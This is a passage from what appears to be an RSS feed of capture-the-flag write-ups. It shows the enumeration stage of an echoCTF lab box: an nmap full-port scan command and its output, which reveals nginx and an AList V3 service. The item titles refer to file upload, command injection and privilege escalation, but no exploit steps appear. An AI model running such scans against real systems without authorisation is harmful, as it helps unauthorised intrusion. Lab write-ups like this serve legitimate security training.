+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;generator&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;AList V3&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;theme-color&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;#000000&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;google&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;notranslate&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">script&lt;/span> &lt;span class="n">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;https://g.alicdn.com/IMM/office-js/1.1.5/aliyun-web-office-sdk.min.js&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">async&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="n">script&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">link&lt;/span> &lt;span class="n">rel&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;shortcut icon&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;image/ico&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;https://cdn.jsdelivr.net/gh/alist-org/logo@main/logo.svg&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">title&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="n">AList&lt;/span>&lt;span class="o">&amp;lt;/&lt;/span>&lt;span class="n">title&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">script&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">window&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ALIST&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="nl">cdn&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span>&lt;span class="n">_&lt;/span> &lt;span class="nl">monaco_cdn&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">undefin&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Analyzing the NMAP scan we can see there are 2 ports open 1337 and 5244.
+Port 1337 is an NGINX webserver and we also get the version &lt;code>1.18.0&lt;/code>
+Port 5244, is unknown at the moment but we can see a lot of output.&lt;/p></description></item><item><title>echoCTF Alister Writeup: File Upload to Root via Exposed Credentials</title><link>https://hack.com.cy/writeups/htb/delivery/delivery/</link><pubDate>Wed, 25 Jun 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/writeups/htb/delivery/delivery/</guid><description>&lt;h2 id="video-walkthrough">Video Walkthrough&lt;/h2>
+&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+ &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/1vaSEr6mfFA?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video">&lt;/iframe>
+ &lt;/div>
+
+&lt;p>&lt;a href="https://www.youtube.com/watch?v=1vaSEr6mfFA&amp;amp;t=1s">&lt;img src="https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube" alt="Watch on YouTube">&lt;/a>&lt;/p>
+&lt;h1 id="alister">Alister&lt;/h1>
+&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="nmap-port-scan">NMAP Port Scan&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -nvv -p- 10.0.50.0 -T4 -sC -sV
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="output">Output&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="n">PORT&lt;/span> &lt;span class="n">STATE&lt;/span> &lt;span class="n">SERVICE&lt;/span> &lt;span class="n">REASON&lt;/span> &lt;span class="n">VERSION&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">1337&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">tcp&lt;/span> &lt;span class="n">open&lt;/span> &lt;span class="n">http&lt;/span> &lt;span class="n">syn&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">ack&lt;/span> &lt;span class="n">ttl&lt;/span> &lt;span class="mi">63&lt;/span> &lt;span class="n">nginx&lt;/span> &lt;span class="mf">1.18.0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nl">methods&lt;/span>&lt;span class="p">:&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span>&lt;span class="n">_&lt;/span> &lt;span class="n">Supported&lt;/span> &lt;span class="nl">Methods&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">GET&lt;/span> &lt;span class="n">HEAD&lt;/span> &lt;span class="n">POST&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span>&lt;span class="n">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nl">title&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Site&lt;/span> &lt;span class="n">doesnt&lt;/span> &lt;span class="n">have&lt;/span> &lt;span class="n">a&lt;/span> &lt;span class="nf">title&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">charset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">UTF&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">).&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span>&lt;span class="n">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nl">header&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">nginx&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.18.0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">5244&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">tcp&lt;/span> &lt;span class="n">open&lt;/span> &lt;span class="n">unknown&lt;/span> &lt;span class="n">syn&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">ack&lt;/span> &lt;span class="n">ttl&lt;/span> &lt;span class="mi">63&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">fingerprint&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nl">strings&lt;/span>&lt;span class="p">:&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="nl">GenericLines&lt;/span>&lt;span class="p">:&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.1&lt;/span> &lt;span class="mi">400&lt;/span> &lt;span class="n">Bad&lt;/span> &lt;span class="n">Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">Content&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nl">Type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">text&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">plain&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">charset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">utf&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">8&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="nl">Connection&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">close&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="nl">GetRequest&lt;/span>&lt;span class="p">:&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.0&lt;/span> &lt;span class="mi">200&lt;/span> &lt;span class="n">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">Content&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nl">Type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">text&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="nl">Date&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Mon&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">23&lt;/span> &lt;span class="n">Jun&lt;/span> &lt;span class="mi">2025&lt;/span> &lt;span class="mi">19&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mi">54&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mi">26&lt;/span> &lt;span class="n">GMT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;!&lt;/span>&lt;span class="n">DOCTYPE&lt;/span> &lt;span class="n">html&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">html&lt;/span> &lt;span class="n">lang&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;en&amp;#34;&lt;/span> &lt;span class="n">translate&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;no&amp;#34;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">head&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">script&lt;/span> &lt;span class="n">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;https://polyfill.io/v3/polyfill.min.js?features=String.prototype.replaceAll&amp;#34;&lt;/span>&lt;span class="o">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="n">script&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">charset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;utf-8&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;viewport&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;width=device-width, initial-scale=1&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;referrer&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;same-origin&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;generator&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;AList V3&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;theme-color&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;#000000&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;google&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;notranslate&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">script&lt;/span> &lt;span class="n">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;https://g.alicdn.com/IMM/office-js/1.1.5/aliyun-web-office-sdk.min.js&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">async&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="n">script&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">link&lt;/span> &lt;span class="n">rel&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;shortcut icon&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;image/ico&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;https://cdn.jsdelivr.net/gh/alist-org/logo@main/logo.svg&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">title&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="n">AList&lt;/span>&lt;span class="o">&amp;lt;/&lt;/span>&lt;span class="n">title&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">script&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">window&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ALIST&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="nl">cdn&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="nl">monaco_cdn&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">undefin&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="nl">HTTPOptions&lt;/span>&lt;span class="p">:&lt;/span> 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.0&lt;/span> &lt;span class="mi">200&lt;/span> &lt;span class="n">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">Content&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nl">Type&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">text&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="nl">Date&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Mon&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">23&lt;/span> &lt;span class="n">Jun&lt;/span> &lt;span class="mi">2025&lt;/span> &lt;span class="mi">19&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mi">54&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mi">27&lt;/span> &lt;span class="n">GMT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;!&lt;/span>&lt;span class="n">DOCTYPE&lt;/span> &lt;span class="n">html&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">html&lt;/span> &lt;span class="n">lang&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;en&amp;#34;&lt;/span> &lt;span class="n">translate&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;no&amp;#34;&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">head&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">script&lt;/span> &lt;span class="n">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;https://polyfill.io/v3/polyfill.min.js?features=String.prototype.replaceAll&amp;#34;&lt;/span>&lt;span class="o">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="n">script&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">charset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;utf-8&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;viewport&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;width=device-width, initial-scale=1&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;referrer&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;same-origin&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;generator&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;AList V3&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;theme-color&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;#000000&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">meta&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;google&amp;#34;&lt;/span> &lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;notranslate&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">script&lt;/span> &lt;span class="n">src&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;https://g.alicdn.com/IMM/office-js/1.1.5/aliyun-web-office-sdk.min.js&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">async&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;gt;&amp;lt;/&lt;/span>&lt;span class="n">script&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">link&lt;/span> &lt;span class="n">rel&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;shortcut icon&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;image/ico&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;https://cdn.jsdelivr.net/gh/alist-org/logo@main/logo.svg&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">title&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="n">AList&lt;/span>&lt;span class="o">&amp;lt;/&lt;/span>&lt;span class="n">title&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">script&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="n">window&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">ALIST&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span> &lt;span class="nl">cdn&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="err">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">|&lt;/span>&lt;span class="n">_&lt;/span> &lt;span class="nl">monaco_cdn&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">undefin&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Analyzing the NMAP scan we can see there are 2 ports open 1337 and 5244.
+Port 1337 is an NGINX webserver and we also get the version &lt;code>1.18.0&lt;/code>
+Port 5244, is unknown at the moment but we can see a lot of output.&lt;/p></description></item><item><title>echoCTF Contactlens Writeup: File Upload to Root via Command Injection</title><link>https://hack.com.cy/writeups/echoctf/contactlens/contactlens/</link><pubDate>Wed, 25 Jun 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/writeups/echoctf/contactlens/contactlens/</guid><description>&lt;h2 id="video-walkthrough">Video Walkthrough&lt;/h2>
+&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
